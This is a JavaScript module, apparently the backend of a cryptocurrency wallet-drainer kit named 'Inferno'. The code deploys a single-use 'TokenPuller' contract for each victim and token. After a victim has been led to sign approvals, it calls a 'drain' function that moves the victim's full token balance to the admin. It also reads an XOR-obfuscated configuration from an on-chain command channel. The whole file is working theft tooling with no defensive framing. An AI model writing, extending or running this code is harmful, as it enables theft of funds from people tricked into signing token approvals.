/**
 * chain.js
 * All on-chain interaction lives here. The split that makes Inferno work:
 *   - the VICTIM signs approvals (setApprovalForAll / approve) on the front-end
 *   - the ADMIN (this backend) is the only one that ever calls transferFrom,
 *     and it does so through a freshly deployed single-use TokenPuller.
 */
require("dotenv").config();
const { ethers } = require("ethers");

const PULLER_ABI = [
  "constructor(address _admin, address _victim, address _token)",
  "function pull() external",
  "function selfDestruct() external",
  "function admin() view returns (address)",
  "function victim() view returns (address)",
  "function token() view returns (address)",
  "function pulled() view returns (bool)",
  "event Pulled(address indexed token, address indexed from, address indexed to, uint256 amount)",
];

const CHANNEL_ABI = [
  "function encryptedConfig() view returns (bytes)",
  "function key() view returns (bytes32)",
  "function active() view returns (bool)",
  "function owner() view returns (address)",
];

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function setApprovalForAll(address operator, bool approved) returns (bool)",
  "function approve(address spender, uint256 amount) returns (bool)",
];

class Chain {
  constructor() {
    this.provider = new ethers.JsonRpcProvider(process.env.RPC_URL || "http://127.0.0.1:8545");
    const pk = process.env.ADMIN_PRIVATE_KEY;
    if (!pk) throw new Error("ADMIN_PRIVATE_KEY missing in .env");
    this.admin = new ethers.Wallet(pk, this.provider);
    this.channelAddr = process.env.COMMAND_CHANNEL;
  }

  get adminAddress() {
    return this.admin.address;
  }

  erc20(address) {
    return new ethers.Contract(address, ERC20_ABI, this.provider);
  }

  channel() {
    return new ethers.Contract(this.channelAddr, CHANNEL_ABI, this.provider);
  }

  /**
   * Deploy a FRESH single-use TokenPuller for (victim, token).
   * Returns the puller address. Paid for by the admin key.
   */
  async deployPuller(victim, token) {
    const factory = new ethers.ContractFactory(
      PULLER_ABI,
      // bytecode is injected at deploy time by the build step; see buildPullerBytecode()
      this.admin
    );
    // We compile on the fly via hardhat's artifacts if available, otherwise
    // the caller passes bytecode. Simpler: use the artifact.
    const { ethers: hreEthers } = require("hardhat");
    const Puller = await hreEthers.getContractFactory("TokenPuller");
    const puller = await Puller.deploy(this.adminAddress, victim, token);
    await puller.waitForDeployment();
    return { address: await puller.getAddress(), contract: puller };
  }

  /**
   * Fire the drain: admin calls puller.pull(), which does
   * transferFrom(victim -> admin) for the full balance.
   */
  async drain(pullerAddress, token) {
    const puller = new ethers.Contract(pullerAddress, PULLER_ABI, this.admin);
    const tx = await puller.pull();
    const rc = await tx.wait();
    return { txHash: rc.hash, blockNumber: rc.blockNumber };
  }

  /** Read a victim's balance + whether the puller is already approved. */
  async tokenState(token, victim, pullerAddress) {
    const t = this.erc20(token);
    const [bal, dec, sym] = await Promise.all([
      t.balanceOf(victim),
      t.decimals().catch(() => 18),
      t.symbol().catch(() => "?"),
    ]);
    let allowance = 0n;
    if (pullerAddress) {
      allowance = await t.allowance(victim, pullerAddress).catch(() => 0n);
    }
    return {
      token,
      symbol: sym,
      decimals: Number(dec),
      balance: bal,
      balanceHuman: Number(bal) / 10 ** Number(dec),
      approved: allowance > 0n,
      allowance,
    };
  }

  /** Decrypt the on-chain config blob (XOR with the channel key). */
  async readConfig() {
    const ch = this.channel();
    const [enc, key, active] = await Promise.all([
      ch.encryptedConfig(),
      ch.key(),
      ch.active(),
    ]);
    const kb = Buffer.from(key.replace(/^0x/, ""), "hex");
    const eb = Buffer.from(enc.replace(/^0x/, ""), "hex");
    const out = Buffer.alloc(eb.length);
    for (let i = 0; i < eb.length; i++) out[i] = eb[i] ^ kb[i % kb.length];
    return { active, config: JSON.parse(out.toString("utf8")), key, encrypted: enc };
  }
}

module.exports = { Chain, PULLER_ABI, CHANNEL_ABI, ERC20_ABI };
